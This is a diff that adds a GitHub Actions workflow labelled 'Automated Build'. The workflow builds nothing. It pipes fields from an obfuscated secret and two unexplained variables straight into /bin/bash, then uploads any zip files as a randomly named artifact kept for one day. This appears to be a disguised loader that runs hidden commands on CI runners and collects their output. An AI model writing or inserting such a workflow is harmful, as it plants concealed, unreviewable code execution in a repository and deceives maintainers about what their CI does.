@@ -1,0 +1,28 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          y3: ${{ secrets.y3 }}
+        run: |
+          printf '%s' "$y3" | jq -r .wlf9 | /bin/bash
+          printf '%s' "$g0634" | jq -r .xhm90 | /bin/bash
+          echo $z944 | jq -r .gm9115 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: nvmTZWoC
+          path: "*.zip"
+          retention-days: 1
